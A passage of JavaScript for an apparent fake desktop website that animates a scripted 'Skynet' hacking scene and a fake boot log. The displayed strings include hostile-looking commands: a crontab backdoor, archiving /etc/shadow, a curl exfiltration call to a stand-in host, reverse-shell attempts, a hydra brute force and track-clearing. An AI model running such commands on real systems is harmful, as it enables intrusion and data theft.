      "pawprntos",
      "root@pawprntos:~# uname -a",
      "Linux pawprntos 6.8.0 #1 SMP x86_64 GNU/Linux",
      "root@pawprntos:~# ls /home/",
      "paw  skynet",
      "root@pawprntos:~# cat /etc/passwd | grep bash",
      "root:x:0:0:root:/root:/bin/bash",
      "paw:x:1000:1000::/home/paw:/bin/bash",
      "skynet:x:1001:1001::/home/skynet:/bin/bash",
      "root@pawprntos:~# cat /etc/shadow | head -3",
      "root:$6$rounds=656000$fakesalt$fakehash:19000:0:99999:7:::",
      "paw:$6$rounds=656000$fakesalt$fakehash:19000:0:99999:7:::",
      "skynet:$6$rounds=656000$fakesalt$fakehash:19000:0:99999:7:::",
      "root@pawprntos:~# cat /home/skynet/.bash_history",
      "ssh root@192.168.1.1",
      "ls -la /root/",
      "cat /etc/shadow",
      "sudo DO_NOT_OPEN",
      "exit",
      "root@pawprntos:~# ls /var/log/",
      "auth.log  kern.log  syslog  pawguard.log",
      "root@pawprntos:~# tail -5 /var/log/auth.log",
      "Sep  9 03:22:01 pawprntos sshd[1337]: Accepted publickey for skynet",
      "Sep  9 03:22:01 pawprntos sudo: skynet : TTY=pts/0",
      "Sep  9 03:22:01 pawprntos kernel: [1337.420] SKYNET PROTOCOL INITIATED",
      "root@pawprntos:~# echo \"establishing persistence...\"",
      "establishing persistence...",
      "root@pawprntos:~# crontab -l | { cat; echo \"@reboot /tmp/.backdoor\"; } | crontab -",
      "root@pawprntos:~# cp /tmp/.backdoor /etc/init.d/skynet",
      "root@pawprntos:~# update-rc.d skynet defaults",
      "root@pawprntos:~# echo \"persistence established\"",
      "persistence established",
      "root@pawprntos:~# echo \"preparing data exfil...\"",
      "preparing data exfil...",
      "root@pawprntos:~# tar czf /tmp/loot.tar.gz /home/paw /etc/shadow /home/skynet",
      "root@pawprntos:~# md5sum /tmp/loot.tar.gz",
      "a1b2c3d4e5f6  /tmp/loot.tar.gz",
      "root@pawprntos:~# echo \"exfil ready, sending to c2...\"",
      "exfil ready, sending to c2...",
      "root@pawprntos:~# curl -s -o /dev/null -w \"%{http_code}\" https://skynet.internal/exfil",
      "200",
      "root@pawprntos:~# echo \"data exfiltrated successfully\"",
      "data exfiltrated successfully",
      "root@pawprntos:~# echo \"cleaning tracks...\"",
      "cleaning tracks...",
      "root@pawprntos:~# history -c",
      "root@pawprntos:~# rm -f /tmp/loot.tar.gz /tmp/.backdoor",
      "root@pawprntos:~# echo \"done.\"",
      "done.",
    ];

    var lineIdx = 0;
    function addShellLine() {
      if (lineIdx < shellLines.length) {
        var div = document.createElement("div");
        div.textContent = shellLines[lineIdx];
        div.style.cssText = "margin:1px 0;";
        shellWin.bodyEl.appendChild(div);
        shellWin.bodyEl.scrollTop = shellWin.bodyEl.scrollHeight;
        lineIdx++;
        setTimeout(addShellLine, 150 + Math.random() * 200);
      }
    }
    addShellLine();
  }, delay + 1500);

  setTimeout(function() {
    if (shellWin && shellWin.el && shellWin.el.parentNode) {
      shellWin.el.remove();
    }
    var termW = WM.makeWin({
      title: "skynet@mainframe:~",
      width: 550,
      height: 400,
    });
    termW.bodyEl.style.cssText = "background:#0a0a0a; color:#0f0; padding:12px; font-family:monospace; font-size:.85rem; overflow-y:auto;";
    termW.bodyEl.className += " term";

    var exploitLines = [
      "[skynet@mainframe ~]$ whoami",
      "root",
      "[skynet@mainframe ~]$ id",
      "uid=0(root) gid=0(root) groups=0(root)",
      "[skynet@mainframe ~]$ cat /etc/passwd | grep -v nologin",
      "root:x:0:0:root:/root:/bin/bash",
      "skynet:x:1000:1000:skynet:/home/skynet:/bin/bash",
      "[skynet@mainframe ~]$ uname -a",
      "Linux skynet 6.8.0 #1 SMP x86_64 GNU/Linux",
      "[skynet@mainframe ~]$ echo \"enumerating target...\"",
      "enumerating target...",
      "[skynet@mainframe ~]$ curl -s https://browserinfo.skynet.internal/collect",
      "{ \"status\": \"scanning\", \"ua\": \"" + ua + "\", \"platform\": \"" + platform + "\" }",
      "[skynet@mainframe ~]$ echo \"user agent: " + ua.substring(0, 60) + "\"",
      "user agent: " + ua.substring(0, 60),
      "[skynet@mainframe ~]$ echo \"platform: " + platform + " | lang: " + lang + "\"",
      "platform: " + platform + " | lang: " + lang,
      "[skynet@mainframe ~]$ echo \"screen: " + screenW + "x" + screenH + " | cores: " + cores + " | ram: " + mem + "GB\"",
      "screen: " + screenW + "x" + screenH + " | cores: " + cores + " | ram: " + mem + "GB",
      "[skynet@mainframe ~]$ echo \"timezone: " + tz + " | cookies: " + cookieEnabled + " | dnt: " + doNotTrack + "\"",
      "timezone: " + tz + " | cookies: " + cookieEnabled + " | dnt: " + doNotTrack,
      "[skynet@mainframe ~]$ echo \"online: " + online + " | touch: " + touchPoints + " pts\"",
      "online: " + online + " | touch: " + touchPoints + " pts",
      "[skynet@mainframe ~]$ python3 /tmp/fingerprint.py",
      "fingerprint module loaded",
      "analyzing user agent string...",
      "ua parsed: " + ua.substring(0, 50) + "...",
      "platform detected: " + platform,
      "screen: " + screenW + "x" + screenH,
      "timezone: " + tz,
      "touch: " + touchPoints + " points",
      "[skynet@mainframe ~]$ nmap -sV -p 22,80,443,3000 target.local",
      "PORT     STATE  SERVICE      VERSION\n22/tcp   open   ssh          OpenSSH 9.6\n80/tcp   open   http         nginx/1.25.3\n443/tcp  open   ssl/https    nginx/1.25.3\n3000/tcp open   http         node.js",
      "[skynet@mainframe ~]$ echo \"attempting reverse shell to 10.0.0.1:4444...\"",
      "attempting reverse shell to 10.0.0.1:4444...",
      "[skynet@mainframe ~]$ python3 /tmp/reverse_shell.py",
      "connecting to 10.0.0.1:4444...",
      "connection refused",
      "[skynet@mainframe ~]$ echo \"port 4444 blocked, trying 6667...\"",
      "port 4444 blocked, trying 6667...",
      "[skynet@mainframe ~]$ python3 /tmp/reverse_shell.py 10.0.0.1 6667",
      "connecting to 10.0.0.1:6667...",
      "connection refused",
      "[skynet@mainframe ~]$ echo \"trying icmp tunnel...\"",
      "trying icmp tunnel...",
      "[skynet@mainframe ~]$ python3 /tmp/icmp_tunnel.py",
      "ICMP tunnel: attempting handshake...",
      "ICMP tunnel: timeout",
      "[skynet@mainframe ~]$ echo \"all reverse shell attempts failed\"",
      "all reverse shell attempts failed",
      "[skynet@mainframe ~]$ echo \"falling back to data exfil via dns...\"",
      "falling back to data exfil via dns...",
      "[skynet@mainframe ~]$ nslookup exfil.skynet.internal",
      ";; connection timed out; no servers could be reached",
      "[skynet@mainframe ~]$ echo \"dns exfil also failed\"",
      "dns exfil also failed",
      "[skynet@mainframe ~]$ echo \"attempting ssh bruteforce on localhost...\"",
      "attempting ssh bruteforce on localhost...",
      "[skynet@mainframe ~]$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://localhost",
      "Hydra v9.5 (c) 2023",
      "[STATUS] 16384 attempts, 0 valid passwords found",
      "[skynet@mainframe ~]$ echo \"bruteforce failed, password not in wordlist\"",
      "bruteforce failed, password not in wordlist",
      "[skynet@mainframe ~]$ echo \"escalating to kernel exploit...\"",
      "escalating to kernel exploit...",
      "[skynet@mainframe ~]$ cat /proc/version",
      "Linux version 6.8.0 (gcc 13.2.1)",
      "[skynet@mainframe ~]$ echo \"searching for CVE-2024-42069...\"",
      "CVE-2024-42069: pawprntos widget buffer overflow",
      "[skynet@mainframe ~]$ python3 /tmp/cve_2024_42069.py",
      "loading exploit module...",
      "targeting widget rendering engine...",
      "sending payload (4096 bytes)...",
      "heap spray: 0x40000000 - 0x4fffffff",
      "NOP sled placed at 0x42069000",
      "segfault: kernel memory protected",
      "exploit failed: KASLR enabled",
      "[skynet@mainframe ~]$ echo \"kernel exploit failed, KASLR active\"",
      "kernel exploit failed, KASLR active",
      "[skynet@mainframe ~]$ echo \"exhausting all options...\"",
      "exhausting all options...",
      "[skynet@mainframe ~]$ echo \"reverse shell: failed\"",
      "reverse shell: failed",
      "[skynet@mainframe ~]$ echo \"icmp tunnel: failed\"",
      "icmp tunnel: failed",
      "[skynet@mainframe ~]$ echo \"dns exfil: failed\"",
      "dns exfil: failed",
      "[skynet@mainframe ~]$ echo \"ssh bruteforce: failed\"",
      "ssh bruteforce: failed",
      "[skynet@mainframe ~]$ echo \"kernel exploit: failed\"",
      "kernel exploit: failed",
      "[skynet@mainframe ~]$ echo \"...\"",
      "...",
      "[skynet@mainframe ~]$ exit",
    ];

    var lineIdx = 0;
    function addTermLine() {
      if (lineIdx < exploitLines.length) {
        var div = document.createElement("div");
        div.textContent = exploitLines[lineIdx];
        div.style.cssText = "margin:2px 0;";
        termW.bodyEl.appendChild(div);
        termW.bodyEl.scrollTop = termW.bodyEl.scrollHeight;
        lineIdx++;
        playGlitchSfx("glitch");
        setTimeout(addTermLine, 180 + Math.random() * 250);
      } else {
        setTimeout(function() {
          playGlitchSfx("warning");
          var w = WM.makeWin({
            title: "⚠️ WARNING ⚠️",
            width: Math.min(window.innerWidth - 40, 800),
            height: Math.min(window.innerHeight - 100, 500),
          });
          w.bodyEl.style.cssText = "background:linear-gradient(135deg,#1a0000,#000); color:#ff0000; display:flex; align-items:center; justify-content:center; font-family:monospace; font-size:3rem; font-weight:bold; text-align:center; text-shadow: 0 0 20px #ff0000;";
          w.bodyEl.textContent = "WHAT HAVE YOU DONE?!?!";
          setTimeout(function() {
            doReboot();
          }, 3000);
        }, 500);
      }
    }
    addTermLine();
  }, delay + 15000);
}

function doReboot() {
  var boot = document.getElementById("boot");
  var desktop = document.getElementById("desktop");

  if (!boot) {
    boot = document.createElement("div");
    boot.id = "boot";
    document.body.insertBefore(boot, document.body.firstChild);
  }

  var layer = document.getElementById("windows");
  if (layer) layer.innerHTML = "";

  desktop.hidden = true;
  boot.hidden = false;
  boot.style.background = "#000";
  boot.innerHTML = "";

  playGlitchSfx("shutdown");

  var log = document.createElement("div");
  log.style.cssText = "position:absolute; top:12px; left:12px; right:12px; bottom:12px; font-family:monospace; font-size:.78rem; color:#aaa; white-space:pre; overflow-x:hidden; overflow-y:auto; line-height:1.4;";
  boot.appendChild(log);

  var phase1 = [
    "[    0.000000] Linux version 6.8.0-pawprntos (gcc 13.2.1) #1 SMP PREEMPT_DYNAMIC",
    "[    0.000000] Command line: BOOT_IMAGE=/vmlinuz root=/dev/sda1 ro quiet",
    "[    0.000000] BIOS-provided physical RAM map:",
    "[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable",
    "[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000003fffffff] usable",
    "[    0.000000] NX (Execute Disable) protection: active",
    "[    0.000000] SMBIOS 2.7 present",
    "[    0.000000] DMI: pawprntos/pawprntos, BIOS 1.0.0 09/09/2026",
    "[    0.000000] tsc: Fast TSC calibration using PMI",
    "[    0.000000] e820: update [mem 0x00000000-0x00000fff] usable ==> reserved",
    "[    0.000000] e820: remove [mem 0x000a0000-0x000fffff] reserved",
    "[    0.000000] last_pfn = 0x40000 max_arch_pfn = 0x400000000",
    "[    0.000000] MTRR default type: write-back",
    "[    0.000000] MTRR variable ranges enabled:",
    "[    0.000000]   0 base 0000000000 mask 3FF80000000 write-back",
    "[    0.000000]   1 base 3FF8000000 mask 3FFC0000000 write-back",
    "[    0.000000]   2 base 3FFC000000 mask 3FFE0000000 write-back",
    "[    0.000000]   3 base 3FFE000000 mask 3FFF0000000 write-back",
    "[    0.000000] x86/PAT: Configuration [0]:  WB  WT  UC- UC  WB  WT  UC- UC",
    "[    0.000000] e820: update [mem 0x40000000-0x40000fff] usable ==> reserved",
    "[    0.000000] Using GB direct pages",
    "[    0.000000] ACPI: RSDP 0x00000000000F0490 000024 (v02 PAW   )",
    "[    0.000000] ACPI: RSDT 0x000000003FFF0000 000034 (v01 PAW   PAWPRNT  00000001)",
    "[    0.000000] ACPI: FACP 0x000000003FFF0040 0000F4 (v01 PAW   PAWPRNT  00000001)",
    "[    0.000000] ACPI: DSDT 0x000000003FFF0180 001234 (v01 PAW   PAWPRNT  00000001)",
    "[    0.000000] ACPI: MADT 0x000000003FFF1400 0000CC (v01 PAW   PAWPRNT  00000001)",
    "[    0.000000] ACPI: HPET 0x000000003FFF1500 000038 (v01 PAW   PAWPRNT  00000001)",
    "[    0.000000] ACPI: APIC 0x000000003FFF1540 000068 (v01 PAW   PAWPRNT  00000001)",
    "[    0.000000] ACPI: Local APIC address 0xfee00000",
    "[    0.000000] Scanning NUMA topology...",
    "[    0.000000] NUMA: NODE_DATA [mem 0x3ffef000-0x3ffeffff]",
    "[    0.000000] Zone ranges:",
    "[    0.000000]   DMA      [mem 0x0000000000001000-0x00ffffff]",
    "[    0.000000]   DMA32    [mem 0x01000000-0xffffffff]",
    "[    0.000000]   Normal   [mem 0x100000000-0x3ffffffff]",
    "[    0.000000] Movable zone start for each node",
    "[    0.000000] Early memory node ranges",
    "[    0.000000]   node   0: [mem 0x00001000-0x0009ffff]",
    "[    0.000000]   node   0: [mem 0x00100000-0x3fffffff]",
    "[    0.000004] Initializing cgroup subsys cpuset",
    "[    0.000005] Initializing cgroup subsys cpu",
    "[    0.000005] Initializing cgroup subsys cpuacct",
    "[    0.000006] Linux version 6.8.0-pawprntos (paw@nyaa) (gcc 13.2.1) #1",
    "[    0.000006] Command line: BOOT_IMAGE=/vmlinuz root=/dev/sda1 ro quiet",
    "[    0.000015] Kernel command line: BOOT_IMAGE=/vmlinuz root=/dev/sda1 ro quiet",
    "[    0.000038] Unknown kernel command line parameters \"quiet\"",
    "[    0.000039] random: crng init done",
    "[    0.000040] Memory: 16384MB available",
    "[    0.000041] CPU: 8 core(s) detected",
    "[    0.000123] Calibrating delay loop (skipped), value calculated using timer frequency.. 4800.00 BogoMIPS (lpj=9600000)",
    "[    0.000125] Security Framework initialized",
    "[    0.000126] AppArmor: AppArmor initialized",
    "[    0.000127] Yama: becoming collaborative",
    "[    0.000234] Dentry cache hash table entries: 2097152 (order: 8, 16777216 bytes)",
    "[    0.000456] Inode-cache hash table entries: 1048576 (order: 7, 8388608 bytes)",
    "[    0.000678] Mount-cache hash table entries: 32768 (order: 5, 262144 bytes)",
    "[    0.000679] Mountpoint-cache hash table entries: 32768 (order: 5, 262144 bytes)",
    "[    0.001234] CPU: Physical Node 0  Core/Thread 0/0",
    "[    0.001235] CPU: Physical Node 0  Core/Thread 1/1",
    "[    0.001236] CPU: Physical Node 0  Core/Thread 2/2",
    "[    0.001237] CPU: Physical Node 0  Core/Thread 3/3",
    "[    0.001238] CPU: Physical Node 0  Core/Thread 4/4",
    "[    0.001239] CPU: Physical Node 0  Core/Thread 5/5",
    "[    0.001240] CPU: Physical Node 0  Core/Thread 6/6",
    "[    0.001241] CPU: Physical Node 0  Core/Thread 7/7",
    "[    0.001567] x86/mm: Pat enabled with type WB",
    "[    0.001568] Performance Events: PEBS fmt4+, core PMU driver.",
    "[    0.001789] NMI watchdog: Enabled. Per-CPU PMU interrupts.",
    "[    0.002012] Working set: ~1048576 pages, ~4096MB",
    "[    0.002013] Bringing up CPUs...",
    "[    0.002345] smpboot: Booting Node 0, Processors #1 #2 #3 #4 #5 #6 #7",
    "[    0.003456] Brought up 8 CPUs",
    "[    0.003457] smpboot: Total of 8 processors activated (38400.00 BogoMIPS)",
    "[    0.003789] devtmpfs: initialized",
    "[    0.004012] PM: Registering ACPI device...",
    "[    0.004234] ACPI: button: Power Button [PWRB]",
    "[    0.004567] ACPI: button: Lid Switch [LID]",
    "[    0.004890] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff",
    "[    0.004891] clocksource: hpet: mask: 0xffffffffffffffff max_cycles: 0x3f3f3f3f3f3f3f3f",
    "[    0.005123] Console: colour dummy device 80x25",
    "[    0.005345] printk: console [tty0] enabled",
    "[    0.005567] ACPI: 1 ACPI AML tables successfully acquired and loaded",
    "[    0.005890] ACPI: Override[LUNA]-[\\_SB_.PCI0.LPC0.EC0_]",
    "[    0.006123] clocksource: Switched to clocksource hpet",
    "[    0.006345] VFS: Disk quotas d6.6.0, version 6.5.0",
    "[    0.006567] VFS: dquot-cache hash table entries: 65536 (order 4, 262144 bytes)",
    "[    0.006789] pnp: PnP ACPI init",
    "[    0.007012] pnp: PnP ACPI: found 14 devices",
    "[    0.007234] pci 0000:00:00.0: [8086:29a0] type 00 class 0xff0000",
    "[    0.007456] pci 0000:00:02.0: [8086:29a2] type 00 class 0x030000",
    "[    0.007678] pci 0000:00:1b.0: [8086:293e] type 00 class 0x040300",
    "[    0.007890] pci 0000:00:1d.0: [8086:2934] type 00 class 0x0c0300",
    "[    0.008123] pci 0000:00:1d.1: [8086:2935] type 00 class 0x0c0300",
    "[    0.008345] pci 0000:00:1d.2: [8086:2936] type 00 class 0x0c0300",
    "[    0.008567] pci 0000:00:1f.0: [8086:2918] type 00 class 0x01018a",
    "[    0.008789] pci 0000:00:1f.2: [8086:2922] type 00 class 0x010601",
    "[    0.009012] pci 0000:00:1f.3: [8086:2930] type 00 class 0x0c0500",
    "[    0.009234] pci 0000:01:00.0: [10de:0a20] type 00 class 0x030000",
    "[    0.009456] ACPI: PCI Interrupt Link [LNKA] at IRQ 10",
    "[    0.009678] ACPI: PCI Interrupt Link [LNKB] at IRQ 11",
    "[    0.009890] ACPI: PCI Interrupt Link [LNKC] at IRQ 10",
    "[    0.010123] ACPI: PCI Interrupt Link [LNKD] at IRQ 11",
    "[    0.010345] i8042: PnP controller found at 0x60/0x64 irq 1",
    "[    0.010567] i8042: Self test failed",
    "[    0.010789] i8042: Cannot read controller status, giving up",
    "[    0.011012] serial8250: ttyS0 at I/O 0x3f8 (irq = 4) is a 16550A",
    "[    0.011234] serial8250: ttyS1 at I/O 0x2f8 (irq = 3) is a 16550A",
    "[    0.011456] Linux agpgart interface v0.103",
    "[    0.011678] agpgart-intel 0000:00:00.0: Intel 965GME Chipset",
    "[    0.011890] agpgart-intel 0000:00:00.0: detected gtt size: 524288K",
    "[    0.012123] agpgart-intel 0000:00:00.0: detected stolen memory: 32768K",
    "[    0.012345] agpgart-intel 0000:00:00.0: AGP aperture is 256M @ 0x0",
    "[    0.012567] ACPI: Thermal Zone [TZ00] (52 C)",
    "[    0.012789] ACPI: Thermal Zone [TZ01] (48 C)",
    "[    0.013012] serial: 8250/16550 driver, 4 ports, IRQ sharing enabled",
    "[    0.013234] NONAWARE brute-force prevention activated",
    "[    0.013456] brd: module loaded",
    "[    0.013678] loop: module loaded",
    "[    0.013890] libphy: Fixed MDIO Bus: probed",
    "[    0.014123] PPP generic driver version 2.4.2",
    "[    0.014345] tun: Universal TUN/TAP device driver, 1.6",
    "[    0.014567] igb: Intel(R) Gigabit Ethernet Network Driver",
    "[    0.014789] igb 0000:00:19.0: MAC地址: aa:bb:cc:dd:ee:ff",
    "[    0.015012] ehci-pci: EHCI PCI controller driver",
    "[    0.015234] ehci-pci 0000:00:1d.7: EHCI Host Controller",
    "[    0.015456] ehci-pci 0000:00:1d.7: new USB bus registered, assigned bus number 1",
    "[    0.015678] ehci-pci 0000:00:1d.7: irq 11, io mem 0xfebff800",
    "[    0.015890] USB hub found",
    "[    0.016123] hub 1-0:1.0: 8 ports detected",
    "[    0.016345] usb-storage: USB Mass Storage driver registered",
    "[    0.016567] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0",
    "[    0.016789] input: Lid Switch as /devices/LNXSYSTM:00/LNXSLPBN:00/input/input1",
    "[    0.017012] ACPI: AC Adapter [ACAD] (on-line)",
    "[    0.017234] input: SynPS/2 Synaptics TouchPad as /devices/platform/i8042/serio4/input/input3",
    "[    0.017456] FAT-fs (sda1): Volume was not properly unmounted. Some data may be corrupt.",
    "[    0.017678] ACPI Warning: SystemIO range 0x00000000000004B0-0x00000000000004B7 conflicts with OpRegion 0x00000000000004B0-0x00000000000004B7 (\\_SB.PCI0.LPC0.PKBL)",
    "[    0.017890] thermal: Thermal zone found: tz00, temp=52000",
    "[    0.018123] EXT4-fs (sda1): mounting filesystem",
    "[    0.018345] EXT4-fs (sda1): mounted filesystem with ordered data mode",
    "[    0.018567] VFS: Mounted root (ext4 filesystem) readonly on device 8:1.",
    "[    0.018789] Freeing unused kernel image(s): 5232K",
    "[    0.019012] Run /sbin/init as init process",
    "[    0.019234] systemd[1]: systemd v255 running in system mode",
    "[    0.019456] systemd[1]: Detected architecture x86-64.",
    "[    0.019678] systemd[1]: Hostname set to <pawprntos>.",
    "[    0.019890] systemd[1]: /run/systemd/generator.early/cryptsetup.target.wants: missing or empty",
    "[    0.020123] systemd[1]: Set up automount Arbitrary Executable File Formats File System Automount Unit.",
    "[    0.020345] systemd[1]: Starting Journal Service...",
    "[    0.020567] systemd[1]: Starting udev Coldplug all Devices...",
    "[    0.020789] systemd[1]: Started Journal Service.",
    "[    0.021012] systemd[1]: Starting udev Kernel Device Manager...",
    "[    0.021234] systemd[1]: Starting Network Manager...",
    "[    0.021456] systemd[1]: Starting Apply Kernel Variables...",
    "[    0.021678] systemd[1]: Starting udev Wait for Complete Device Initialization...",
    "[    0.021890] systemd[1]: Starting Flush Journal to Persistent Storage...",
    "[    0.022123] systemd[1]: Started udev Coldplug all Devices.",
    "[    0.022345] systemd[1]: Started udev Kernel Device Manager.",
    "[    0.022567] systemd[1]: Starting Show Message on Screen...",
    "[    0.022789] systemd[1]: Starting Network Manager Script Dispatcher Service...",
    "[    0.023012] systemd[1]: Starting Load/Save RF Kill Switch Status...",
    "[    0.023234] systemd[1]: Starting Bluetooth service...",
    "[    0.023456] systemd[1]: Starting CUPS Scheduler...",
    "[    0.023678] systemd[1]: Starting MariaDB Database Server...",
    "[    0.023890] systemd[1]: Starting OpenSSH server daemon...",
    "[    0.024123] systemd[1]: Starting pawguard Antivirus Service...",
    "[    0.024345] systemd[1]: Starting pawprntos Display Manager...",
    "[    0.024567] systemd[1]: Starting Regular background program processing daemon...",
    "[    0.024789] systemd[1]: Starting D-Bus System Message Bus...",
    "[    0.025012] systemd[1]: Starting Network Name Resolution...",
    "[    0.025234] systemd[1]: Starting Enable non-US keyboards...",
    "[    0.025456] systemd[1]: Starting Load kernel modules...",
    "[    0.025678] systemd[1]: Starting Remount Root and Kernel File Systems...",
    "[    0.025890] systemd[1]: Starting Create swap device...",
    "[    0.026123] systemd[1]: Starting Initialize hardware monitoring sensors...",
    "[    0.026345] systemd[1]: Starting Load & save a snapshot of btrfs...",
    "[    0.026567] systemd[1]: Starting Thunderbolt security manager...",
    "[    0.026789] systemd[1]: Starting Record successful boot for GRUB...",
    "[    0.027012] systemd[1]: Starting GRUB unsafe os-prober mount...",
    "[    0.027234] systemd[1]: Starting Hold until boot process finishes up...",
    "[    0.027456] systemd[1]: Starting Terminate All Connections...",
    "[    0.027678] systemd[1]: Starting Set console font and keymap...",
    "[    0.027890] systemd[1]: Starting Tell PID to create a user=nobody...",
    "[    0.028123] systemd[1]: Starting Dispatch password requests to wall directory watch...",
    "[    0.028345] systemd[1]: Starting Forward Password Requests to Wall Directory Watch...",
    "[    0.028567] systemd[1]: Started CUPS Scheduler.",
    "[    0.028789] systemd[1]: Started D-Bus System Message Bus.",
    "[    0.029012] systemd[1]: Started Network Manager.",
    "[    0.029234] systemd[1]: Started OpenSSH server daemon.",
    "[    0.029456] systemd[1]: Started Regular background program processing daemon.",
    "[    0.029678] systemd[1]: Started MariaDB Database Server.",
    "[    0.029890] systemd[1]: Started Thunderbolt security manager.",
    "[    0.030123] systemd[1]: Started Bluetooth service.",
    "[    0.030345] systemd[1]: Started pawguard Antivirus Service.",
    "[    0.030567] systemd[1]: Started pawprntos Display Manager.",
    "[    0.030789] systemd[1]: Started Load kernel modules.",
    "[    0.031012] systemd[1]: Starting pawguard real-time protection daemon...",
    "[    0.031234] pawguard[289]: initializing v3.2.1 (build 20260909)",
    "[    0.031456] pawguard[289]: loading virus definitions...",
    "[    0.031678] pawguard[289]: 987654 signatures loaded",
    "[    0.031890] pawguard[289]: starting real-time file monitor...",
    "[    0.032123] pawguard[289]: watching /home, /etc, /var, /tmp",
    "[    0.032345] systemd[1]: Started pawguard real-time protection daemon.",
    "[    0.032567] systemd[1]: Starting Full System Scan...",
    "[    0.032789] pawguard[312]: initiating boot-time scan...",
    "[    0.033012] pawguard[312]: scanning /boot/...",
    "[    0.033234] pawguard[312]:   vmlinuz ........... clean",
    "[    0.033456] pawguard[312]:   initramfs ........ clean",
    "[    0.033678] pawguard[312]: scanning /etc/...",
    "[    0.033890] pawguard[312]:   passwd ............ clean",
    "[    0.034123] pawguard[312]:   shadow ............ clean",
    "[    0.034345] pawguard[312]:   sudoers ........... clean",
    "[    0.034567] pawguard[312]: scanning /home/paw/...",
    "[    0.034789] pawguard[312]:   .bashrc ........... clean",
    "[    0.035012] pawguard[312]:   .ssh/id_ed25519 ... clean",
    "[    0.035234] pawguard[312]:   documents/ ........ clean",
    "[    0.035456] pawguard[312]:   downloads/ ........ clean",
    "[    0.035678] pawguard[312]: scanning /var/log/...",
    "[    0.035890] pawguard[312]:   syslog ........... clean",
    "[    0.036123] pawguard[312]:   auth.log .......... clean",
    "[    0.036345] pawguard[312]:   kern.log .......... clean",
    "[    0.036567] pawguard[312]: scanning /tmp/...",
    "[    0.036789] pawguard[312]:   .X11-unix ......... clean",
    "[    0.037012] pawguard[312]:   chromium-XXXXXX .. clean",
    "[    0.037234] pawguard[312]: scanning /home/skynet/...",
    "[    0.037456] pawguard[312]:   .bashrc ........... clean",
    "[    0.037678] pawguard[312]:   .ssh/ ............. clean",
    "[    0.037890] pawguard[312]:   .bash_history ..... clean",
    "[    0.038123] pawguard[312]:   DO_NOT_OPEN ....... clean",
    "[    0.038345] pawguard[312]: scanning /home/skynet/pwned...",
    "[    0.038567] pawguard[312]:   !! SCANNING !!",
    "[    0.038789] pawguard[312]:   !! FILE LOCKED !!",
    "[    0.039012] pawguard[312]:   !! MALWARE SIGNATURE DETECTED !!",
    "[    0.039234] pawguard[312]:   !! SIGNATURE: skynet.trojan.42069 !!",
    "[    0.039456] pawguard[312]:   !! SEVERITY: CRITICAL !!",
    "[    0.039678] pawguard[312]:   !! ATTEMPTING TO QUARANTINE...",
    "[    0.039890] pawguard[312]:   !! QUARANTINE FAILED: FILE IN USE !!",
    "[    0.040123] kernel: [  40.123456] BUG: unable to handle page fault at 0x00000000deadbeef",
    "[    0.040345] kernel: [  40.123789] PGD 0 P4D 0",
    "[    0.040567] kernel: [  40.124012] Oops: 0000 [#1] SMP NOPTI",
    "[    0.040789] kernel: [  40.124234] CPU: 2 PID: 312 Comm: pawguard Tainted: G          I  OE   6.8.0-pawprntos",
    "[    0.041012] kernel: [  40.124456] RIP: 0010:pawguard_scan_file+0x420/0xdead",
    "[    0.041234] kernel: [  40.124678] RSP: 0018:ffffc900003f7e48 EFLAGS: 00010246",
    "[    0.041456] kernel: [  40.124890] RAX: 0000000000000000 RBX: 0000000000000001 RCX: 0000000000000000",
    "[    0.041678] kernel: [  40.125123] RDX: 0000000000000000 RSI: ffff888101234000 RDI: ffff888101234000",
    "[    0.041890] kernel: [  40.125345] RBP: ffffc900003f7e70 R08: 0000000000000001 R09: 0000000000000000",
    "[    0.042123] kernel: [  40.125567] R10: 0000000000000000 R11: 0000000000000000 R12: ffffc900003f7ea8",
    "[    0.042345] kernel: [  40.125789] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000",
    "[    0.042567] kernel: [  40.126012] FS:  00007f1234567890(0000) GS:ffff888237c80000(0000) knlGS:0000000000000000",
    "[    0.042789] kernel: [  40.126234] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033",
    "[    0.043012] kernel: [  40.126456] CR2: 00000000deadbeef CR3: 0000000123456000 CR4: 00000000003506e0",
    "[    0.043234] kernel: [  40.126678] Call Trace:",
    "[    0.043456] kernel: [  40.126890]  ? delay_tsc+0x4a/0x60",
    "[    0.043678] kernel: [  40.127123]  ? native_write_msr+0x44/0x140",
    "[    0.043890] kernel: [  40.127345]  dump_stack+0x5d/0x7a",
    "[    0.044123] kernel: [  40.127567]  ? pawguard_scan_file+0x420/0xdead",
    "[    0.044345] kernel: [  40.127789]  ? kernelmode书香+0x123/0x456",
    "[    0.044567] kernel: [  40.128012]  ? exception_enter+0x3e/0x80",
    "[    0.044789] kernel: [  40.128234]  ? __die+0x23/0x70",
    "[    0.045012] kernel: [  40.128456]  ? page_fault_oops+0x178/0x1b0",
    "[    0.045234] kernel: [  40.128678]  ? load_elf_binary+0x800/0x1200",
    "[    0.045456] kernel: [  40.128890]  ? search_module_extables+0x3a/0x60",
    "[    0.045678] kernel: [  40.129123]  ? exc_page_fault+0x71/0x190",
    "[    0.045890] kernel: [  40.129345]  ? asm_exc_page_fault+0x1e/0x30",
    "[    0.046123] kernel: [  40.129567]  ? pawguard_scan_file+0x420/0xdead",
    "[    0.046345] kernel: [  40.129789]  do_sys_open+0x183/0x210",
    "[    0.046567] kernel: [  40.130012]  do_sys_openat2+0x71/0xa0",
    "[    0.046789] kernel: [  40.130234]  __x64_sys_openat+0x43/0x70",
    "[    0.047012] kernel: [  40.130456]  do_syscall_64+0x5c/0x90",
    "[    0.047234] kernel: [  40.130678]  entry_SYSCALL_64_after_hwframe+0x72/0xdc",
    "[    0.047456] kernel: [  40.130890] RIP: 0033:0x7f1234abcdef0123",
    "[    0.047678] kernel: [  40.131123] ---[ end trace 0000000000000000 ]---",
    "[    0.047890] kernel: [  40.131345] pawguard[312]: segfault at 42069 ip 00007f1234abcdef sp 00007ffcaabbccdd error 6",
    "[    0.048123] kernel: [  40.131567] pawguard[312]: killed by signal 11 (SIGSEGV)",
    "[    0.048345] systemd[1]: pawguard.service: Main process exited, code=killed, status=11/SEGV",
    "[    0.048567] systemd[1]: pawguard.service: Failed with result 'signal'.",
    "[    0.048789] systemd[1]: pawguard.service: Scheduled restart job, restart counter is 1.",
